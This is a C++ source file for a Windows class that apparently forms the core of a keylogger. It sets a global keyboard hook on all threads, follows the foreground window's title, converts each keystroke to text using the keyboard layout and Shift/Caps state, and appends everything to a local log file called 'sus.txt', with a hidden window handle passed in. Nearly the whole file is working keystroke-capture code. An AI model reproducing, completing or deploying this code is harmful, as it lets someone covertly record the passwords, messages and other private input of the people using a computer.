#include "HandleUserInputs.h"


bool HandleUserInput::_isCapsLock = false;
bool HandleUserInput::_isNumLock = false;
bool HandleUserInput::_isScrollLock = false;
bool HandleUserInput::_isShift = false;
LPCWSTR HandleUserInput::_filename = L"";
HANDLE HandleUserInput::hFile = NULL;




HandleUserInput::HandleUserInput(HANDLE hiddenWnd)
{
	_hiddenWnd = hiddenWnd;
	HookId = NULL;
	WindowHookId = NULL;

	_filename = L"sus.txt";

	GetFile();
};


HandleUserInput::~HandleUserInput()
{
	CloseHandle(this->file);
};

//HHOOK HandleUserInput::SetHook(int typeOfHook, HOOKPROC lpfn) {
//	WH_KEYBOARD;
//	HANDLE curProc = GetCurrentProcess();
//	__try {
//		return SetWindowsHookEx(typeOfHook, lpfn, NULL, 0);
//	}
//	__finally {
//		delete(curProc);
//	}
//}

HHOOK HandleUserInput::SetHook(int typeOfHook, HOOKPROC lpfn, DWORD dwThreadId) {
	HHOOK hookId = SetWindowsHookEx(typeOfHook, lpfn, NULL, 0);
	if (hookId == NULL) {
		// TODO: 
	}
	return hookId;
}

HWINEVENTHOOK HandleUserInput::SetWinHook(WINEVENTPROC callBack)
{
	__try {
		return SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, callBack, 0, 0, WINEVENT_OUTOFCONTEXT);
	}
	__finally {
	}
}

//void HandleUserInput::ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
//{
//	//std::FILE.AppendAllTExt
//	//TODO: FILE APPEND
//	char str[maxChars];
//	sprintf_s(str, "%s %s %s", "\n", (char*)GetActiveWindowTitle(), "\n");
//	AppendTextToFile(str);
//}


LPWSTR HandleUserInput::GetActiveWindowTitle()
{
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window

	char cTxtLen = GetWindowTextLength(hwnd);

	// Allocate memory for the string and copy 
	// the string into the memory. 

	LPWSTR wnd_title = (LPWSTR)VirtualAlloc((LPVOID)NULL, (DWORD)(cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE);
	GetWindowText(hwnd, wnd_title, cTxtLen + 1);

	return wnd_title;
}

char* HandleUserInput::ConvertWcharToChar(LPWSTR str)
{
	// Convert the wchar_t string to a char* string. Record
	// the length of the original string and add 1 to it to
	// account for the terminating null character.
	size_t origsize = wcslen(str) + 1;
	size_t convertedChars = 0;


	// Allocate two bytes in the multibyte output string for every wide
	// character in the input string (including a wide character
	// null). Because a multibyte character can be one or two bytes,
	// you should allot two bytes for each character. Having extra
	// space for the new string isn't an error, but having
	// insufficient space is a potential security problem.
	const size_t newsize = origsize * 2;
	// The new string will contain a converted copy of the original
	// string plus the type of string appended to it.
	char* nstring = new char[newsize];

	// Put a copy of the converted string into nstring
	wcstombs_s(&convertedChars, nstring, newsize, str, _TRUNCATE);
	return nstring;
}

std::string HandleUserInput::ConvertWideStringToUTF8(const wchar_t* str)
{

	int len = WideCharToMultiByte(CP_UTF8, 0, (str), -1, NULL, 0, NULL, NULL);
	LPSTR str8 = new char[len];
	
	WideCharToMultiByte(CP_UTF8, 0, (str), -1, str8, len, NULL, NULL);
	std::string result = str8;
	return result;

}

void HandleUserInput::SetKeysState()
{
	_isCapsLock = GetKeyState(VK_CAPITAL) != 0;
	_isNumLock = GetKeyState(VK_NUMLOCK) != 0;
	_isScrollLock = GetKeyState(VK_SCROLL) != 0;
	_isShift = GetKeyState(VK_SHIFT) != 0;
}

//std::string HandleUserInput::GetSymbol(UINT vkCode)
//{
//	WCHAR pwszBuff [maxChars];
//	BYTE lpKeyState [maxChars];
//	HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
//
//	// Получение виртуального кода клавиши
//	UINT virtualKeyCode = MapVirtualKey(vkCode, MAPVK_VSC_TO_VK);
//
//	// Получение символа с помощью ToUnicodeEx
//	int result = ToUnicodeEx(virtualKeyCode, vkCode, lpKeyState, pwszBuff, maxChars, 0, keyboard);
//	//ToUnicodeEx(vkCode, 0, lpKeyState, pwszBuff, maxChars, 0, keyboard);
//
//	std::wstring ws = (pwszBuff);
//	std::string buffSymbol = std::string(ws.begin(), ws.end());
//
//	std::string symbol = (wcscmp(pwszBuff, L"\r") != 0) ? "\n" : buffSymbol;
//	if (_isCapsLock ^ _isShift)
//	{
//		for (int i = 0; i < symbol.length(); i++)
//		{
//			symbol[i] = toupper(symbol[i]);
//		}
//	}
//	return symbol;
//}

std::wstring HandleUserInput::GetSymbol(UINT vkCode)
{
	WCHAR pwszBuff[maxChars];
	BYTE lpKeyState[maxChars];

	HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
	GetKeyboardState(lpKeyState);

	ToUnicodeEx(vkCode, 0, lpKeyState, pwszBuff, maxChars, 0, keyboard);

	std::wstring ws(pwszBuff);

	std::wstring symbol = (ws == L"\r") ? L"\n" : ws;

	if (_isCapsLock ^ _isShift)
	{
		for (size_t i = 0; i < symbol.length(); i++)
		{
			//symbol[i] = toupper(symbol[i]);
			symbol[i] = towupper(symbol[i]);
		}
	}

	return symbol;
}

LPDWORD HandleUserInput::AppendTextToFile(std::string buffer)
{
	//LPDWORD written = 0;
	//WriteFile((HANDLE)file, (LPCVOID)buffer.c_str(), buffer.size(), written, NULL);
	//return written;

	DWORD bytesWritten = 0;
	BOOL result = WriteFile(HandleUserInput::hFile, buffer.c_str(), buffer.size(), &bytesWritten, NULL);

	if (result)
	{
		// Запись прошла успешно
		LPDWORD written = new DWORD(bytesWritten);
		return written;
	}
	else
	{
		// Обработка ошибок записи
		return nullptr;
	}
}

LPDWORD HandleUserInput::AppendTextToFileW(std::wstring buffer)
{
	//LPDWORD written = 0;
	//WriteFile((HANDLE)file, (LPCVOID)buffer.c_str(), buffer.size(), written, NULL);
	//return written;
	DWORD bytesToWrite = sizeof(wchar_t) * buffer.size();
	DWORD bytesWritten = 0;
	BOOL result = WriteFile(HandleUserInput::hFile, buffer.c_str(), bytesToWrite, &bytesWritten, NULL);

	if (result)
	{
		// Запись прошла успешно
		LPDWORD written = new DWORD(bytesWritten);
		return written;
	}
	else
	{
		// Обработка ошибок записи
		return nullptr;
	}
}



void HandleUserInput::GetFile()
{
	bool res = false;
	//file = OpenFile(_filename, NULL, OF_EXIST | OF_READWRITE);

	//if (file == HFILE_ERROR)
	//{
	//	file = OpenFile(_filename, NULL, OF_READWRITE | OF_CREATE);
	//}
	//else
	//{
	//	file = OpenFile(_filename, NULL, OF_READWRITE);
	//}

	// Проверяем, существует ли файл
	DWORD fileAttributes = GetFileAttributes(_filename);
	bool fileExists = (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));

	if (fileExists)
	{
		// Файл существует, просто открываем его для чтения и записи без перезаписи
		//hFile = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		hFile = CreateFile(_filename, GENERIC_READ | FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	}
	else
	{
		// Файл не существует, создаем его
		hFile = CreateFile(_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	}

	// Проверяем, успешно ли открыт или создан файл
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// Обработка ошибок: не удалось открыть или создать файл
		res =  false;
	}

	res =  true;
}
